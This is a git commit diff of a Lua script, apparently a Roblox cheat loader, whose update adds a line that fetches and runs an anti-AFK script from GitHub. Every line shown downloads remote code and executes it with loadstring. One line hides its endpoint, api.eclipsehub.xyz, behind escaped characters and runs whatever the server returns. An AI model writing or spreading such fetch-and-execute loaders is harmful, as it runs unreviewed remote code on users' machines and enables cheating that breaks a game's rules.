595b2fc96c8fbcdc6444a261110e5d04195187c9
Maximusikk <78302672+Maximusikk@users.noreply.github.com>
2024-12-22 21:59:44 +0500

    Update main2.lua

--- main2.lua
+++ main2.lua
@@ -1,5 +1,6 @@
 loadstring(Game:HttpGet("https://raw.githubusercontent.com/Maximusikk/newScript/refs/heads/main/discordBall.lua"))()
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KazeOnTop/Rice-Anti-Afk/main/Wind", true))()
 getgenv().mainKey = "nil"
 
 local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
